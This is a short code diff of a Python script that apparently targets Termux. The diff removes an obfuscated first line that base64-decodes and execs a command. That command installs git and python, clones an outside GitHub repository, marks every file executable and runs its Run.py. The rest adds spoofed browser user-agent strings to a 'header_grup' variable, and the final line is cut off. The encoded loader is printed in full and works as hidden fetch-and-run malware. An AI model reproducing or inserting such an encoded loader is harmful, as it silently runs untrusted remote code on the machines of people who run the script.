@@ -1,4 +1,3 @@
-import base64;exec(base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgicGtnIGluc3RhbGwgZ2l0ICYmIHBrZyBpbnN0YWxsIHB5dGhvbiAmJiBjZCAmJiBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL1JhYmJpLTE0My9SYW5kb20tRmlsZS5naXQgJiYgY2QgUmFuZG9tLUZpbGUgJiYgY2htb2QgK3ggKiAmJiBweXRob24gUnVuLnB5Iik='))
 
 
 import os
@@ -194,4 +193,6 @@ header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;
 header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
 header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
 header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
-header_grup = 
+header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
+header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"}
+header_grup = {"user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NE
